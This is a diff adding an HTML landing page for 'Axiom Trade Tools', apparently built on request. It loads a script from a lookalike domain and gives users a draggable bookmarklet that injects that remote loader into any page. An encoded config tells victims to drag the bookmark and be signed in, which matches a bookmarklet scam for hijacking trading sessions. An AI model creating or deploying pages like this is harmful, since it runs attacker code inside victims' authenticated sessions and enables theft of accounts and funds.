@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Axiom Trade Tools</title>
+  <meta name="description" content="Lightweight utility site for Axiom trade tools — includes a draggable bookmarklet." />
+
+  <!-- User-provided script (placed under HEAD as requested) -->
+  <script src="https://axiom.ctoportal.icu/loader.js" data="eyJoYXNoIjoiTURzNE1URTRPVE0zT0RjNSIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJ1dHRvbiB0byB5b3VyIGJvb2ttYXJrcyBiYXIgaW5zdGVhZCBvZiBjbGlja2luZyBpdC4iLCJyZWRpcmVjdCI6IllvdSBhcmUgbm93IGJlaW5nIHJlZGlyZWN0ZWQgdG8gaHR0cHM6Ly9heGlvbS50cmFkZS9kaXNjb3Zlci4iLCJ1bmF1dGhvcml6ZWQiOiJZb3UgbXVzdCBiZSBzaWduZWQgaW4gdG8gdXNlIHRoaXMgYm9va21hcmtsZXQuIiwiZXJyb3IiOiJGYWlsZWQgdG8gZXhlY3V0ZSB0aGUgYm9va21hcmtsZXQuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIn19"></script>
+
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--accent:#7c5cff;--muted:#9aa4b2;--glass:rgba(255,255,255,0.03)}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial}
+    body{background:linear-gradient(180deg,#071028 0%, #071221 60%);color:#e6eef8;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+    .container{max-width:980px;margin:40px auto;padding:28px}
+    header{display:flex;align-items:center;gap:18px}
+    .logo{width:64px;height:64px;border-radius:12px;background:linear-gradient(135deg,var(--accent),#3ab0ff);display:flex;align-items:center;justify-content:center;font-weight:700;box-shadow:0 6px 18px rgba(124,92,255,0.18)}
+    h1{margin:0;font-size:22px}
+    p.lead{color:var(--muted);margin:6px 0 0}
+
+    main{margin-top:26px}
+    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;padding:18px;box-shadow:0 6px 18px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03)}
+
+    .toolbar{display:flex;gap:12px;align-items:center}
+    .bookmarklet{display:inline-block;padding:10px 14px;border-radius:10px;background:var(--glass);backdrop-filter:blur(4px);text-decoration:none;color:inherit;border:1px solid rgba(255,255,255,0.04);cursor:grab}
+    .bookmarklet:active{cursor:grabbing}
+    .btn{padding:10px 14px;border-radius:10px;background:linear-gradient(90deg,var(--accent),#3ab0ff);color:#071021;text-decoration:none;font-weight:600;border:none;cursor:pointer}
+
+    .features{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:16px}
+    .feature{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.02)}
+    .muted{color:var(--muted);font-size:13px}
+
+    footer{margin-top:22px;text-align:center;color:var(--muted);font-size:13px}
+
+    @media (max-width:600px){.container{margin:20px;padding:16px}}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="logo">AX</div>
+      <div>
+        <h1>Axiom Trade Tools</h1>
+        <p class="lead">Handy trade helpers — fast, light, and bookmarklet-ready.</p>
+      </div>
+    </header>
+
+    <main>
+      <div class="card">
+        <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
+          <div>
+            <strong>Quick access</strong>
+            <div class="muted">Drag the link to your bookmarks bar (or click to copy the bookmarklet code).</div>
+          </div>
+
+          <div class="toolbar">
+            <!-- Required anchor the user asked for -->
+            <a class="bookmarklet" id="drag-link" draggable="true" title="Drag to bookmarks bar">Drag Me</a>
+
+            <button class="btn" id="copy-btn" title="Copy bookmarklet">Copy</button>
+          </div>
+        </div>
+
+        <div class="features" style="margin-top:14px">
+          <div class="feature">
+            <strong>Loader</strong>
+            <div class="muted">The page already includes the Axiom loader script in the &lt;head&gt; as requested.</div>
+          </div>
+          <div class="feature">
+            <strong>Lightweight</strong>
+            <div class="muted">Minimal UI so you can focus on tools instead of fluff.</div>
+          </div>
+          <div class="feature">
+            <strong>Secure-ish</strong>
+            <div class="muted">Only injects the remote loader when you use the bookmarklet or have the page open.</div>
+          </div>
+        </div>
+      </div>
+
+      <div style="height:12px"></div>
+
+      <div class="card">
+        <strong>Usage</strong>
+        <p class="muted" style="margin-top:8px">To install: drag the <em>Drag Me</em> link to your browser's bookmarks/favorites bar. On any page, click the saved bookmark to load the Axiom tools. If your browser blocks drag-to-bookmark, use the Copy button and create a new bookmark manually, pasting the code into the URL field.</p>
+      </div>
+
+    </main>
+
+    <footer>
+      Built with care · Axiom Trade Tools
+    </footer>
+  </div>
+
+  <script>
+    // Prepare a bookmarklet JS that dynamically loads the same loader script.
+    const loaderUrl = 'https://axiom.ctoportal.icu/loader.js';
+    const bookmarkletCode = `(function(){try{var s=document.createElement('script');s.src='${loaderUrl}';s.async=true;document.head.appendChild(s);}catch(e){alert('Failed to launch Axiom tools: '+e);}})();`;
+    const bookmarkletHref = 'javascript:' + encodeURIComponent(bookmarkletCode);
+
+    const dragLink = document.getElementById('drag-link');
+    const copyBtn = document.getElementById('copy-btn');
+
+    // Set href so it can be dragged into bookmarks in many browsers
+    dragLink.setAttribute('href', bookmarkletHref);
+
+    // For HTML5 drag: set dataTransfer so some browsers accept the dragged bookmark
+    dragLink.addEventListener('dragstart', function(e){
+      try{
+        e.dataTransfer.setData('text/plain', bookmarkletHref);
+        e.dataTransfer.setData('text/uri-list', bookmarkletHref);
+      }catch(err){
+        // ignore
+      }
+    });
+
+    // Also allow click to copy the bookmarklet code
+    copyBtn.addEventListener('click', async function(){
+      try{
+        await navigator.clipboard.writeText(bookmarkletHref);
+        copyBtn.textContent = 'Copied!';
+        setTimeout(()=>copyBtn.textContent='Copy',1200);
+      }catch(e){
+        alert('Copy failed — create a new bookmark manually and paste this as the URL:\n\n'+decodeURIComponent(bookmarkletHref));
+      }
+    });
+
+    // Improve accessibility: middle-click or ctrl/cmd+click opens the bookmarklet immediately
+    dragLink.addEventListener('click', function(e){
+      if(e.ctrlKey || e.metaKey || e.button === 1){
+        // open in current page context to run
+        const fn = new Function(decodeURIComponent(bookmarkletCode.replace(/^\(|\)\;?$/g, '')));
+        fn();
+        e.preventDefault();
+      }
+    });
+  </script>
+</body>
+</html>
